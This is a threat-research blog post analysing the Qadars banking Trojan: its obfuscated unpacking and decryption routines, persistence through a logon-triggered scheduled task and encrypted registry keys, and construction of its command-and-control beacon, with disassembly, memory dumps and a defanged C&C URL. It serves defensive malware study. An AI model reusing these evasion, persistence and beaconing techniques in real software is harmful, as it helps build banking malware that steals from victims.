An Analysis of the Qadars Banking Trojan
securityintelligence.com/an-analysis-of-the-qadars-trojan/
July 23, 2015

1/21

Threat Research July 23, 2015
By Igor Aronov 26 min read
I recently noticed a forum thread discussing the Qadars banking Trojan, and at the time, it
had a very low detection rate (4/56) on the VT (virustotal.com) SHA1 :
563379a48d876f6c35317bb7551efeb55754123056109ab030d1e796ae1b9c2c.
I decided it would be a decent candidate for a deeper technical look, and I divided my
analysis into three logical parts:
Stage 1: Obfuscates malicious program flow; protects and decrypts main module.
Stage 2: Gathers per-system unique information, establishes persistence on the
system and runs new process (Stage 3).
Stage 3: Establishes communication with the command-and-control (C&C) center.

Stage 1
This stage consist of two distinct parts. Both are used to protect the main malware module
from detection. The malware performs the following steps to achieve this:
Obfuscates malware’s flow by creating “garbage” code;
Changes the control flow of a program by creating a structured exception handling
(SEH) exception and passing control to it;
Decrypts a blob of data that becomes new code section and jumps to it from an
exception;
Performs an “egg hunt” to find an additional blob of data. This data is then decrypted
and decompressed and becomes a new Portable Executable (PE) image. This is the
main malware module.

2/21

Additional details about the first part of Stage 1 (exception handler):
Resolves address of kernel32.
Resolves address of HeapCreate and allocates buffer of size 0x2729.
Stack before the call to HeapCreate:
012F7A0
012F7A4
012F7A8

00040000
00002729
00002729

;HEAP_CREATE_ENABLE_EXECUTE
;initial size
;max size

Takes the blob of data at offset 0040C9E8 in the original file, then copies and arranges
it.
This blob of data is treated as an array. The array after transformation becomes the new
code section and control is passed to it. The steps taken by the malware to transform array
into the valid code are simple bit swaps based on the key generated offset calculations. The
algorithm is shown below:
1. The blob of data is copied to a buffer allocated on the heap. The buffer is treated as an
array.
2. Calculates an offset for the first character to be swapped:
;Initial key is 0x5A219DBA.
;.text:0041F858 8B 45 14
;.text:0041F85B 33 D2
;.text:0041F85D F7 75 10
;.text:0041F860 89 55 E8

mov
xor
div
mov

eax, [ebp+key]
edx, edx
[ebp+data_size]
[ebp+reminder], edx

mov
add
mov
mov

ecx, [ebp+allocated_buffer]
ecx, [ebp+reminder]
dl, [ecx]
[ebp+current_char_3], dl

1. Stores the result locally:
;.text:0041FAC5 8B 4D 08
;.text:0041FAC8 03 4D E8
;.text:0041FACB 8A 11
;.text:0041FACD 88 55 E4

1. Calculates an offset for the second character to be swapped and stores it locally. This
character is taken from the end of an array minus number of characters already
processed:
;.text:0041FC18 8B 55 08
;.text:0041FC1B 03 55 FC
;.text:0041FC1E 8A 42 FF
;.text:0041FC21 88 45 EC

mov
add
mov
mov

edx, [ebp+allocated_buffer]
edx, [ebp+counter]
al, [edx-1]
[ebp+current_char_1], a

1. Swaps the first and second characters:

3/21

;.text:0041FD4D 8B 45 08
;.text:0041FD50 03 45 E8
;.text:0041FD53 8A 4D EC
;.text:0041FD56 88 08

mov
add
mov
mov

eax, [ebp+allocated_buffer]
eax, [ebp+reminder]
cl, [ebp+current_char_1]
[eax], cl

;.text:0041FFCE 8B 45 08
;.text:0041FFD1 03 45 FC
;.text:0041FFD4 8A 4D E4
;.text:0041FFD7 88 48 FF

mov
add
mov
mov

eax, [ebp+allocated_buffer]
eax, [ebp+counter]
cl, [ebp+current_char_3]
[eax-1], cl

For example, the first two characters to be swapped. Memory before swap:
00BD0614
00BD2728

00
A6

Memory after swap:
00BD0614
00BD2728

A6
00

1. Calculates the key used in the calculations for the next first character to be swapped:
;.text:004201CD 8B 55 14
;.text:004201D0 C1 EA 19
;.text:004201D3 89 55 F0
;.text:004203B1 8B 4D 14
;.text:004203B4 C1 E1 07
;.text:004203B7 89 4D 14
;.text:00420680 8B 55 14
;.text:00420683 0B 55 F0
;.text:00420686 89 55 14
;.text:004207FB 8B 55 14
;.text:004207FE 2B 55 10
;.text:00420801 89 55 14
;.text:00420AD5 8B 45 14
;.text:00420AD8 2D D2 02 96 49
;.text:00420ADD 89 45 14

mov
shr
mov
mov
shl
mov
mov
or
mov
mov
sub
mov
mov
sub
mov

edx, [ebp+key]
edx, 19h
[ebp+new_key], edx
ecx, [ebp+key]
ecx, 7
[ebp+key], ecx
edx, [ebp+key]
edx, [ebp+new_key]
[ebp+key], edx
edx, [ebp+key]
edx, [ebp+data_size]
[ebp+key], edx
eax, [ebp+key]
eax, 499602D2h
[ebp+key], eax

Jumps to the newly created code section:
.text:00406447 FF 55 FC

call

[ebp+allocated_buffer]

Additional details about part two of Stage 1 (in the newly created code section):
Resolves API addresses at runtime and immediately calls those APIs; no Import Table
is created.
Locates an XOR-encrypted blob of data.
Decrypts the blob of data and decompresses it.
The decrypted and decompressed blob is the main malware module.
To find a blob of data, the malware uses a technique similar to the “egg hunt” technique used
in the shellcode. First, it calculated the following data:
4/21

0012F74C
0012F75C
1¿¦

56 6F FC 5A 83 1A 34 D9
31 A8 B9 0B

6F 5C 41 73 28 94 EF 13

VonZâ.4+o\As(ön.

The content of the main malware module is copied into a buffer allocated on the heap. The
first 8 bytes are the marker that the malware is searching for in the executable. This is the
so-called “egg,” and it is found at offset 0xE511 in the executable on the disk. The scanning
is performed from the end to the beginning of the file. Once the marker is found, the malware
calculates the size of the encrypted blob of data. In order to do this, it takes 4 bytes
immediately following the “egg” and XORs it with the data at offset +0x08 in the blob of data
shown above.
Next, 8 bytes in the file and in the blob of data above (offset +0x0C) are used to calculate the
initial XOR key that is used to decrypt the blob of data. The encrypted data in the file starts at
offset 0xE525; the size of the blob of data is 0xC76A. The following function is used to
decrypt the blob of data:

5/21

debug025:00BD0CBE
debug025:00BD0CBE
debug025:00BD0CBE
debug025:00BD0CBE
debug025:00BD0CBE
debug025:00BD0CBE
debug025:00BD0CBE
debug025:00BD0CBE
debug025:00BD0CBE
debug025:00BD0CBE
debug025:00BD0CBE
debug025:00BD0CBE 55
debug025:00BD0CBF 89 E5
debug025:00BD0CC1 83 EC 1C
debug025:00BD0CC4 53
debug025:00BD0CC5 56
debug025:00BD0CC6 57
debug025:00BD0CC7 01 FF
debug025:00BD0CC9 8B 5D 0C
debug025:00BD0CCC F7 D0
debug025:00BD0CCE 42
debug025:00BD0CCF 09 55 F0
debug025:00BD0CD2 83 EB 03
debug025:00BD0CD5 0F AF F7
debug025:00BD0CD8 81 F1 B8 00 00 00
debug025:00BD0CDE 8B 75 08
debug025:00BD0CE1 87 55 EC
debug025:00BD0CE4 21 F2
debug025:00BD0CE6
debug025:00BD0CE6
debug025:00BD0CE6 41
debug025:00BD0CE7 83 FB 00
counter
debug025:00BD0CEA 74 5C
debug025:00BD0CEC 49
debug025:00BD0CED 1B 55 F4
debug025:00BD0CF0 8B 06
debug025:00BD0CF2 33 4D F4
debug025:00BD0CF5 01 C9
debug025:00BD0CF7 33 45 10
debug025:00BD0CFA 09 DF
debug025:00BD0CFC 89 06
debug025:00BD0CFE 2B 55 EC
debug025:00BD0D01 F7 DF
debug025:00BD0D03 49
debug025:00BD0D04 8B 45 10
debug025:00BD0D07 87 55 E8
debug025:00BD0D0A 0F AF FA
debug025:00BD0D0D F7 D7
debug025:00BD0D0F EB 03
debug025:00BD0D14
debug025:00BD0D14
debug025:00BD0D14 C1 C0 07
debug025:00BD0D17 4A

decode_data_to_decompress proc near
var_18= dword ptr -18h
var_14= dword ptr -14h
var_10= dword ptr -10h
var_C= dword ptr -0Ch
var_4= dword ptr -4
data= dword ptr 8
size= dword ptr 0Ch
key= dword ptr 10h
push
mov
sub
push
push
push
add
mov
not
inc
or
sub
imul
xor
mov
xchg
and

ebp
ebp, esp
esp, 1Ch
ebx
esi
edi
edi, edi
ebx, [ebp+size]
eax
edx
[ebp+var_10], edx
ebx, 3
esi, edi
ecx, 0B8h
esi, [ebp+data]
edx, [ebp+var_14]
edx, esi

loc_BD0CE6:
inc
ecx
cmp
ebx, 0
jz
dec
sbb
mov
xor
add
xor
or
mov
sub
neg
dec
mov
xchg
imul
not
jmp

; ebx is the

short loc_BD0D48
ecx
edx, [ebp+var_C]
eax, [esi]
ecx, [ebp+var_C]
ecx, ecx
eax, [ebp+key]
edi, ebx
[esi], eax
edx, [ebp+var_14]
edi
ecx
eax, [ebp+key]
edx, [ebp+var_18]
edi, edx
edi
short loc_BD0D14

loc_BD0D14:
rol
eax, 7
dec
edx

6/21

debug025:00BD0D18 01 F7
debug025:00BD0D1A EB 01
debug025:00BD0D1D
debug025:00BD0D1D
debug025:00BD0D1D 2B 45 0C
debug025:00BD0D20 2B 55 FC
debug025:00BD0D23 87 FF
debug025:00BD0D25 F7 D7
debug025:00BD0D27 2D D2 02 96 49
debug025:00BD0D2C 83 EA 06
debug025:00BD0D2F 01 F7
debug025:00BD0D31 89 45 10
debug025:00BD0D34 81 E2 80 00 00 00
debug025:00BD0D3A 0B 4D E8
debug025:00BD0D3D 4B
debug025:00BD0D3E 11 C7
debug025:00BD0D40 29 C7
debug025:00BD0D42 46
debug025:00BD0D43 0F AF FB
debug025:00BD0D46 EB 9E
debug025:00BD0D48
debug025:00BD0D48
debug025:00BD0D48
debug025:00BD0D48 87 55 EC
debug025:00BD0D4B 29 F3
debug025:00BD0D4D 5F
debug025:00BD0D4E 5E
debug025:00BD0D4F 5B
debug025:00BD0D50 C9
debug025:00BD0D51 C2 0C 00
debug025:00BD0D51

add
jmp

edi, esi
short loc_BD0D1D

loc_BD0D1D:
sub
eax, [ebp+size]
sub
edx, [ebp+var_4]
xchg
edi, edi
not
edi
sub
eax, 499602D2h
sub
edx, 6
add
edi, esi
mov
[ebp+key], eax
and
edx, 80h
or
ecx, [ebp+var_18]
dec
ebx
adc
edi, eax
sub
edi, eax
inc
esi
imul
edi, ebx
jmp
short loc_BD0CE6
; -----------------------------loc_BD0D48:
xchg
edx, [ebp+var_14]
sub
ebx, esi
pop
edi
pop
esi
pop
ebx
leave
retn
0Ch
decode_data_to_decompress endp

Next, the decrypted blob of data is decompressed. The stack before the call to
RtlDecompressBuffer:
0012F270 00000002
;#define COMPRESSION_FORMAT_LZNT1
0012F274 00C20000 debug027:unk_C20000
0012F278 00013600
0012F27C 00C0857D debug026:00C0857D
0012F280 0000C76A
0012F284 0012F714 Stack[00000BBC]:0012F714

;compression format
(0x0002)
;destination
;uncompressed size
;compressed buffer
;compressed size
;final uncompressed size

Stage 2
1. Collects data about the system;
2. Copies itself into a randomly named file located in the “%AppData%\[random_path]\
[random_file_name].exe”;
3. Schedules a task that would run on the current user’s next login;
4. Creates registry keys and stores AES encrypted data (collected in Step 1) in the
registry;
7/21

5. Runs the next stage executable from the “%AppData%\[random_path]\
[random_file_name].exe”.
An additional detail is that the malware collects data about the machine and creates an
interesting structure. For example, on the test machine, the malware creates the following
structure:
00 00 02 00 00 00 06 00
07 54 A4 00 00 00 03 00
33 34 31 2D 38 36 31 39
34 00 2C 00 00 00 41 32
00 00 00 00 00 00 2C CC
E5 97 52 11 03 00 00 00
04 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 B8 03
00 00 EA 32 00 00 00 00
00 00 00 00 00 00 00 00
00 00 2C 47 6C C7 00 BA
+0x02
+0x06
+0x08
+0x0A
+0x0E
+0x12

03 3C 80 5E 96 58 91 B6
00 00 37 36 34 38 37 2D
31 30 33 2D 32 32 30 36
32 2D 30 30 30 30 31 00
C0 A8 22 31 A6 35 23 98
00 00 45 53 07 54 50 6F
00 00 00 00 00 00 00 00
00 00 37 34 34 30 32 00
00 00 80 5E 96 58 00 01
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
0D F0 AD BA 0D F0 AD BA

dwNumberOfProcessors (SYSTEM_INFO)
wProcessorLevel
(SYSTEM_INFO)
wProcessorRevision
(SYSTEM_INFO)
VolumeSerialNumber
InstallDate
"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
DigitalProductID
"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"

An MD5 hash for the above structure is calculated and stored locally. ASCII and UNICODE
strings representing formatted MD5 hashes are created. For example, on the test machine:
00853D20
00853D30

39 37 32 39 35 38 41 36
30 45 42 44 35 35 35 39

35 38 38 30 42 35 35 41
30 37 38 43 31 37 33 35

972958A65880B55A
0EBD5559078C1735

00853E58
00853E68
00853E78
00853E88

39 00 37 00 32 00 39 00
35 00 38 00 38 00 30 00
30 00 45 00 42 00 44 00
30 00 37 00 38 00 43 00

35 00 38 00 41 00 36 00
42 00 35 00 35 00 41 00
35 00 35 00 35 00 39 00
31 00 37 00 33 00 35 00

9.7.2.9.5.8.A.6.
5.8.8.0.B.5.5.A.
0.E.B.D.5.5.5.9.
0.7.8.C.1.7.3.5.

Both MD5 hashes are concatenated with the computer name (‘#’ is used as a separator). An
MD5 hash of this data is calculated. This data becomes the unique GUID that is used by the
malware. The malware uses the same algorithm, as it always produces the same result, but
the result would be unique per infected system.
Next, the malware creates a randomly named path within “%AppData%” and copies itself
into the randomly named executable file located in that directory. For example, on the test
system, the malware created a copy of itself located at:
“%AppData%\MfzxAHCb\HQHKWbsv\PMqLMKtj\oPQVNiRgs.exe”
An MD5 hash of the newly created copy of the malware is calculated and stored along with
the word BOTNET2:
8/21

0012F628
0012F638

8A 15 4F AE 3B 78 B4 8D
42 4F 54 4E 45 54 32 00

B1 71 C4 C9 49 99 E0 C0
00 00 00 00 00 00 00 00

è.O«;x¦.¦q-+IÖa+
BOTNET2.........

The malware creates a scheduled task that would run on the current user’s next login. This is
achieved by performing the following sequence of calls:
1.CoCreateInstance (creates ITaskScheduler, CLSID {148bd52a-a2ab-11ce-b11f00aa00530503},
IID {148bd527-a2ab-11ce-b11f-00aa00530503}).
2.ITaskScheduler::NewWorkItem (creates ITask, CLSID_CTask {148BD520-A2AB-11CE-B11F00AA00530503},
IID_ITask {148BD524-A2AB-11CE-B11F-00AA00530503}).
3.ITask::SetFlags.
4.ITask:SetAccountInformation.
5.ITask::SetWorkingDirectory.
6.ITask::SetApplicationName.
7.ITask::SetMaxRunTime.
8.ITask::CreateTrigger.
9.ITaskTrigger:SetTrigger.
;PTASK_TRIGGER:
;Stack[00000F08]:0012E1BC 30 00
dw 30h
; cbTriggerSize
;Stack[00000F08]:0012E1BE 00 00
dw 0
; Reserved
...............................
;Stack[00000F08]:0012E1D8 04 00 00 00
dd 4
; rgFlags
;Stack[00000F08]:0012E1DC 07 00 00 00
dd 7
;
TASK_EVENT_TRIGGER_AT_LOGON
;Stack[00000F08]:0012E1E0 01 00 00 00
dd 1
; Type
10.ITask::QueryInterface (CLSID_IPersistFile)
11.IPersistFile::Save.

Creates the registry keys “HKCU\\Software\\Classes\\CLSID\\{[unique_per_system_guid]}”.
Populates subkeys “@” , “0” and “1”. The data in the registry is encrypted using AES. The
registry is used to pass data to the next stage. The AES key is derived from the hard-coded
data:
00854028
00854038
00854048

08 00 99 E3 72 5D A8 0E
DE AD 35 3F 41 B9 80 5D
31 00 01 00 53 C3 00 00

FB DF A8 87 42 D4 AA AB
85 D4 2E A1 00 E6 E1 8C
39 37 32 39 35 38 41 36

..Öpr]¿.v¯¿çB+¬½
¦¡5?A¦Ç]à+.í.µßî
1...S+.

87 A8 DF FB AB AA D4 42

pÖ...¿]rç¿¯v½¬+B

The derived key is:
0012E750

E3 99 00 08 0E A8 5D 72

The algorithm for key derivation is:

9/21

.text:0040EA85 0F B6 79 FE
.text:0040EA89 0F B6 59 FF
.text:0040EA8D C1 E7 08
.text:0040EA90 0B FB
.text:0040EA92 0F B6 19
.text:0040EA95 C1 E7 08
.text:0040EA98 0B FB
.text:0040EA9A 0F B6 59 01
.text:0040EA9E C1 E7 08
.text:0040EAA1 0B FB
.text:0040EAA3 89 3C 96
.text:0040EAA6 42
.text:0040EAA7 83 C1 04
.text:0040EAAA 83 FA 04
.text:0040EAAD 7C D6

movzx
movzx
shl
or
movzx
shl
or
movzx
shl
or
mov
inc
add
cmp
jl

edi, byte ptr [ecx-2]
ebx, byte ptr [ecx-1]
edi, 8
edi, ebx
ebx, byte ptr [ecx]
edi, 8
edi, ebx
ebx, byte ptr [ecx+1]
edi, 8
edi, ebx
[esi+edx*4], edi
edx
ecx, 4
edx, 4
short loc_40EA85

Next, the malware runs a copy of itself located in the “%AppData%” directory:
.text:00403BA1 8D 55 E4
lea
edx, [ebp+var_1C]
.text:00403BA4 52
push
edx
lpProcessInformation
.text:00403BA5 8D 45 8C
lea
eax, [ebp+StartupInfo]
.text:00403BA8 50
push
eax
lpStartupInfo
.text:00403BA9 53
push
ebx
lpCurrentDirectory
.text:00403BAA 53
push
ebx
lpEnvironment
.text:00403BAB 68 00 00 00 04
push
CREATE_DEFAULT_ERROR_MODE
dwCreationFlags
.text:00403BB0 53
push
ebx
bInheritHandles
.text:00403BB1 53
push
ebx
lpThreadAttributes
.text:00403BB2 53
push
ebx
lpProcessAttributes
.text:00403BB3 68 F0 19 41 00
push
offset CommandLine
lpCommandLine
.text:00403BB8 8D 8D 79 FC FF FF
lea
ecx, [ebp+MultiByteStr]
.text:00403BBE 51
push
ecx
lpApplicationName
;"%AppData%\MfzxAHCb\HQHKWbsv\PMqLMKtj\oPQVNiRgs.exe".
.text:00403BBF 89 5D E4
mov
[ebp+var_1C], ebx
.text:00403BC2 89 5D E8
mov
[ebp+var_18], ebx
.text:00403BC5 89 5D EC
mov
[ebp+var_14], ebx
.text:00403BC8 89 5D F0
mov
[ebp+var_10], ebx
.text:00403BCB C7 45 8C 44 00 00 00
mov
[ebp+StartupInfo.cb], 44h
.text:00403BD2 FF 15 60 10 41 00
call
ds:CreateProcessA

;

;
;
;
;
;
;
;
;

;

Stage 3
This stage creates a payload for the initial C&C request and sends it. Details of the payload
creation and malware logic for Stage 3 follow.

10/21

The malware calculates computer-specific data (as described in Stage 2) and compares the
result to the data stored in “KEY_CURRENT_USER\Software\Classes\CLSID\
{[computer_unique_guid]}”. If equal, the malware proceeds to the next stage.
Data stored in the registry “HKEY_CURRENT_USER\Software\Classes\CLSID\
{[computer_unique_guid]}\0” is enumerated. For example, on the test machine, the size of
the data is 0x170, and the encrypted data stored in the registry is:
00854B78 5F 1D B6 44 5B 87 A7 2E
00854B88 FC 74 61 04 C2 61 9E 99
00854B98 68 41 E1 33 96 C7 B7 EB
00854BA8 F7 CC B0 27 73 7A 7E 63
00854BB8 7F D1 A6 8B 85 B1 DE E4
00854BC8 B5 B8 D3 56 D3 0A 72 CC
00854BD8 84 2B 45 B8 DB BA 22 C2
00854BE8 02 80 29 90 60 A9 11 13
00854BF8 64 D5 78 FA 2C E3 E5 3A
00854C08 BF 78 2C 45 4F 71 F6 F1
[email protected]`+
00854C18 D9 7B CE AF 87 4F 88 75
00854C28 3D 5D 7C 46 85 B5 92 33
00854C38 46 76 F4 EA 05 D2 71 04
00854C48 E7 E6 5A 51 C5 F1 4A DF
00854C58 6E EF 29 C1 BC C0 32 14
00854C68 40 B2 06 B7 42 85 7C 44
00854C78 E5 A6 CC 26 06 9D 32 B3
00854C88 77 DA 8C 8E 90 3D 0E D1
00854C98 41 1D DA 62 66 08 AF 48
00854CA8 BF 8C 18 49 CA 81 CE 77
00854CB8 5B CE A7 0D 23 09 B6 8D
00854CC8 21 9C EF 83 41 66 72 E1
00854CD8 C9 F2 15 3B BC 38 11 A2

74 81 51 7F 34 CA CC 9D
E5 A7 64 02 8E D2 79 05
83 35 07 43 47 1A A8 74
60 D7 5B AB 43 1B 41 65
B2 B5 A7 7E 74 B6 44 14
62 BF 64 F4 3F 4D F1 D8
B5 95 34 FA 69 85 A6 01
C3 77 31 6E 06 23 BA 3A
2B 18 4C 1F 74 31 B3 25
B4 5D 16 E3 CD 40 60 B8

_.¦D[çº.t.Q.4-¦.
nta.-aPÖsºd.Ä-y.
hAß3û¦+dâ5.CG.¿t
˜¦¦'sz~c`+[½C.Ae
.-ªïà¦¦S¦¦º~t¦D.
¦++V+.r¦b+d(?M±+
ä+E+¦¦"-¦ò4·iàª.
.Ç).`¬..+w1n.#¦:
d+x·,ps:+.L.t1¦%
+x,EOq÷±¦]

FB CC DB 8F AA 33 CF 46
B7 B8 E8 E9 5D 88 17 31
55 B0 BF B3 A1 E9 9C BF
CF 46 8B 4F 54 57 57 4F
B5 3D 84 4C 87 7A 73 BA
65 1E EE 69 2F 7E 37 B8
71 7E D0 13 45 CF 01 D9
F7 FE B1 24 99 20 89 C7
C9 F8 5C F8 3D 83 7E 92
48 93 04 A3 B1 9D 07 60
7E 2E B9 B9 1A 73 3E 84
61 4A 4D 62 4E 0E FF FE
2B 0C 35 CF F4 EB 35 E5

+{+»çOêuv¦¦.¬3-F
=]|Fà¦Æ3++FT]ê.1
Fv(O.-q.U¦+¦íT£+
tµZQ+±J¯-FïOTWWO
nn)-++2.¦=äLçzs¦
@¦.+Bà|De.ei/~7+
sª¦&..2¦q~-.E-.+
w+îÄ.=.-˜¦¦$Ö ë¦
A.+bf.»H+°\°=â~Æ
+î.I-.+wHô.ú¦..`
[+º.#.¦.~.¦¦.s>ä
!£nâAfrßaJMbN. ¦
+=.;+8.ó+.5-(d5s

The decrypted data is:

11/21

00854E90
00854EA0
00854EB0
00854EC0
00854ED0
00854EE0
00854EF0
00854F00
00854F10
00854F20
00854F30
00854F40
00854F50
00854F60
00854F70
00854F80
00854F90
00854FA0
00854FB0
00854FC0
00854FD0
00854FE0
00854FF0

00 00 00 00 67 01 00 00
69 6D 65 01 6E 6D 6F 64
68 65 64 00 66 48 61 73
3B 78 B4 8D B1 71 C4 C9
6F 74 6E 65 74 4E 61 6D
32 6D 73 7A 49 6E 73 74
55 43 3A 5C 44 6F 63 75
64 20 53 65 74 74 69 6E
6C 69 63 61 74 69 6F 6E
7A 78 41 48 43 62 5C 48
50 4D 71 4C 4D 4B 74 6A
67 73 2E 65 78 65 6C 77
61 74 68 58 AA 43 00 3A
00 75 00 6D 00 65 00 6E
00 6E 00 64 00 20 00 53
00 6E 00 67 00 73 00 5C
00 70 00 6C 00 69 00 63
00 6E 00 20 00 44 00 61
00 66 00 7A 00 78 00 41
00 48 00 51 00 48 00 4B
00 5C 00 50 00 4D 00 71
00 6A 00 5C 00 6F 00 50
00 52 00 67 00 73 00 2E

A6 69 46 69 72 73 74 54
75 6C 65 73 46 65 74 63
68 50 45 50 8A 15 4F AE
49 99 E0 C0 6C 73 7A 42
65 67 42 4F 54 4E 45 54
61 6C 6C 50 61 74 68 78
6D 65 6E 74 73 20 61 6E
67 73 5C 69 5C 41 70 70
20 44 61 74 61 5C 4D 66
51 48 4B 57 62 73 76 5C
5C 6F 50 51 56 4E 69 52
49 6E 73 74 61 6C 6C 50
00 5C 00 44 00 6F 00 63
00 74 00 73 00 20 00 61
00 65 00 74 00 74 00 69
00 69 00 5C 00 41 00 70
00 61 00 74 00 69 00 6F
00 74 00 61 00 5C 00 4D
00 48 00 43 00 62 00 5C
00 57 00 62 00 73 00 76
00 4C 00 4D 00 4B 00 74
00 51 00 56 00 4E 00 69
00 65 00 78 00 65 00 00

....g...ªiFirstT
ime.nmodulesFetc
hed.fHashPEPè.O«
;x¦.¦q-+IÖa+lszB
otnetNamegBOTNET
2mszInstallPathx
UC:\Documents an
d Settings\i\App
lication Data\Mf
zxAHCb\HQHKWbsv\
PMqLMKtj\oPQVNiR
gs.exelwInstallP
athX¬C.:.\.D.o.c
.u.m.e.n.t.s. .a
.n.d. .S.e.t.t.i
.n.g.s.\.i.\.A.p
.p.l.i.c.a.t.i.o
.n. .D.a.t.a.\.M
.f.z.x.A.H.C.b.\
.H.Q.H.K.W.b.s.v
.\.P.M.q.L.M.K.t
.j.\.o.P.Q.V.N.i
.R.g.s...e.x.e..

bytes 0 - 3 zeroes,
bytes 4 - 7 the length of the data
bytes 8 - ? data itself.

Next, the data is tokenized:
00854D08 01 00 00 00 00 00 00 00 8A 15 4F AE 3B 78 B4 8D ........è.O«;x¦.
00854D18 B1 71 C4 C9 49 99 E0 C0 42 4F 54 4E 45 54 32 00 ¦q-+IÖa+BOTNET2.
............................................................................
00854E18 00 00 00 00 00 00 00 00 00 00 00 00 00 43 3A 5C .............C:\
00854E28 44 6F 63 75 6D 65 6E 74 73 20 61 6E 64 20 53 65 Documents and Se
00854E38 74 74 69 6E 67 73 5C 69 5C 41 70 70 6C 69 63 61 ttings\i\Applica
00854E48 74 69 6F 6E 20 44 61 74 61 5C 4D 66 7A 78 41 48 tion Data\MfzxAH
00854E58 43 62 5C 48 51 48 4B 57 62 73 76 5C 50 4D 71 4C Cb\HQHKWbsv\PMqL
00854E68 4D 4B 74 6A 5C 6F 50 51 56 4E 69 52 67 73 2E 65 MKtj\oPQVNiRgs.e
00854E78 78 65 00 00 00 00 00 00 00 00 00 00 00 00 00 00 xe..............
............................................................................
00854F28 00 00 43 00 3A 00 5C 00 44 00 6F 00 63 00 75 00 ..C.:.\.D.o.c.u.
00854F38 6D 00 65 00 6E 00 74 00 73 00 20 00 61 00 6E 00 m.e.n.t.s. .a.n.
00854F48 64 00 20 00 53 00 65 00 74 00 74 00 69 00 6E 00 d. .S.e.t.t.i.n.
00854F58 67 00 73 00 5C 00 69 00 5C 00 41 00 70 00 70 00 g.s.\.i.\.A.p.p.
00854F68 6C 00 69 00 63 00 61 00 74 00 69 00 6F 00 6E 00 l.i.c.a.t.i.o.n.
00854F78 20 00 44 00 61 00 74 00 61 00 5C 00 4D 00 66 00
.D.a.t.a.\.M.f.
00854F88 7A 00 78 00 41 00 48 00 43 00 62 00 5C 00 48 00 z.x.A.H.C.b.\.H.
00854F98 51 00 48 00 4B 00 57 00 62 00 73 00 76 00 5C 00 Q.H.K.W.b.s.v.\.
00854FA8 50 00 4D 00 71 00 4C 00 4D 00 4B 00 74 00 6A 00 P.M.q.L.M.K.t.j.
00854FB8 5C 00 6F 00 50 00 51 00 56 00 4E 00 69 00 52 00 \.o.P.Q.V.N.i.R.
00854FC8 67 00 73 00 2E 00 65 00 78 00 65 00 00 00 00 00 g.s...e.x.e.....

12/21

The same operation is performed on the data stored in
“HKEY_CURRENT_USER\Software\Classes\CLSID\{[computer_unique_guid]}\1”. An
interesting structure containing pointers to the domain names and common request page are
stored in the local array-like structure:
00855EF8
00855F08

90 67 85 00 D0 67 85 00
2F 6E 65 74 72 65 70 6F

10 68 85 00 48 68 85 00
72 74 2E 70 68 70 00 00

.gà.-gà..hà.Hhà.
/netreport.php..

Next, the following interesting function is called:
.text:0040FB1B 50
push
eax
.text:0040FB1C 51
push
ecx
;db 'I-C957A26036A04#972958A65880B55A0EBD5559078C1735',0
;this is computer_name#md5hash as described in the dump.txt
.text:0040FB1D 57
push
edi
;'hxxp://soft.kcssoft.biz/netreport.php',0
.text:0040FB1E E8 FD FE FF FF
call
c2

; void *
; int

; int

The first thing the malware does within this function is create a payload for the C&C request.
For example, on the test machine, the first part of the plaintext payload (length 0x123) is:
00856A90 82 A7 69 6C 70 73 7A 42
00856AA0 43 39 35 37 41 32 36 30
00856AB0 32 39 35 38 41 36 35 38
00856AC0 42 44 35 35 35 39 30 37
00856AD0 70 73 7A 56 65 72 73 69
00856AE0 2E 30 68 6D 61 69 6E 54
00856AF0 54 79 70 65 00 67 42 69
00856B00 64 77 54 69 6D 65 73 74
00856B10 61 A2 66 4C 65 6E 67 74
00856B20 61 40 A7 69 6C 70 73 7A
[email protected]ºilpszBotIDx0I
00856B30 2D 43 39 35 37 41 32 36
00856B40 37 32 39 35 38 41 36 35
00856B50 45 42 44 35 35 35 39 30
00856B60 6C 70 73 7A 56 65 72 73
00856B70 30 2E 30 68 6D 61 69 6E
00856B80 62 54 79 70 65 01 67 42
00856B90 6B 64 77 54 69 6D 65 73
00856BA0 74 61 A2 66 4C 65 6E 67
00856BB0 74 61 40 00
[email protected]

6F 74 49 44 78 30 49 2D
33 36 41 30 34 23 39 37
38 30 42 35 35 41 30 45
38 43 31 37 33 35 6B 6C
6F 6E 67 32 2E 30 2E 30
79 70 65 00 67 73 75 62
74 6E 65 73 73 18 20 6B
61 6D 70 00 64 44 61 74
68 00 66 6C 70 44 61 74
42 6F 74 49 44 78 30 49

éºilpszBotIDx0IC957A26036A04#97
2958A65880B55A0E
BD5559078C1735kl
pszVersiong2.0.0
.0hmainType.gsub
Type.gBitness. k
dwTimestamp.dDat
aófLength.flpDat

30 33 36 41 30 34 23 39
38 38 30 42 35 35 41 30
37 38 43 31 37 33 35 6B
69 6F 6E 67 32 2E 30 2E
54 79 70 65 00 67 73 75
69 74 6E 65 73 73 18 20
74 61 6D 70 00 64 44 61
74 68 00 66 6C 70 44 61

-C957A26036A04#9
72958A65880B55A0
EBD5559078C1735k
lpszVersiong2.0.
0.0hmainType.gsu
bType.gBitness.
kdwTimestamp.dDa
taófLength.flpDa

The data has the following format: “string” + data + 1-character separator. For example,
“pszBotID” (string) + “x0I-C957A26036A04#972958A65880B55A0EBD5559078C1735”
(data) + “k” (separator; changes for other entries). The malware generates a pseudorandom
9-byte character string and appends it to the data above:

13/21

014CE6D8
014CE6E8
014CE6F8
014CE708
014CE718
014CE728
014CE738
014CE748
014CE758
014CE768
014CE778
014CE788
014CE798
014CE7A8
014CE7B8
014CE7C8
014CE7D8
014CE7E8
014CE7F8
+00
+04
+0D
+0E

09 00 00 00 79 78 65 46
6C 70 73 7A 42 6F 74 49
37 41 32 36 30 33 36 41
38 41 36 35 38 38 30 42
35 35 39 30 37 38 43 31
56 65 72 73 69 6F 6E 67
6D 61 69 6E 54 79 70 65
65 00 67 42 69 74 6E 65
69 6D 65 73 74 61 6D 70
4C 65 6E 67 74 68 00 66
69 6C 70 73 7A 42 6F 74
35 37 41 32 36 30 33 36
35 38 41 36 35 38 38 30
35 35 35 39 30 37 38 43
7A 56 65 72 73 69 6F 6E
68 6D 61 69 6E 54 79 70
70 65 01 67 42 69 74 6E
54 69 6D 65 73 74 61 6D
66 4C 65 6E 67 74 68 00

5A 72 76 63 78 82 A7 69
44 78 30 49 2D 43 39 35
30 34 23 39 37 32 39 35
35 35 41 30 45 42 44 35
